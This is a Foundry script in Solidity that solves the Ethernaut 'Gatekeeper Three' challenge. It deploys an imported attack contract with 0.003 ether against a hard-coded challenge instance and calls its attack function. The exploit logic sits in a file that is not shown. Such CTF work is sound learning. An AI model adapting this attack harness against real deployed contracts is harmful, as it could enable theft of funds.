// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/GatekeeperThreeAttack.sol"; // 1) add file

contract SolveGatekeeperThree is Script { // 2) change contractName

    function run() external {

        address target = 0xe7d0a482E346Cdef6120C75139B3D4Ff4dE99513; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        GatekeeperThreeAttack attacker = new GatekeeperThreeAttack{value: 0.003 ether}(target);
        attacker.attack();

        vm.stopBroadcast();

    }
}